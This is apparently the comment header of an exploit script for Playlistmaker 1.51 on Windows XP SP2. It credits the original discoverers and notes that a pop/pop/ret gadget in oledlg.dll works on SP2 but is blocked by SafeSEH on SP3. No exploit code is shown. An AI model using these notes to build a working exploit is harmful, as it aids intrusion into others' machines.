# Playlistmaker version 1.51
# Tested on Windows XP SP2 (English)
# Exploit originally discovered by ThE g0bL!N/exploited by germaya_x

# I could not get germaya_x's exploit to work with XP3.
# The only useable p/p/r I could find was in oledlg.dll
# which seems to be compiled with SafeSEH on in XP SP3.
# However, oledlg.dll is useable in XP SP2.
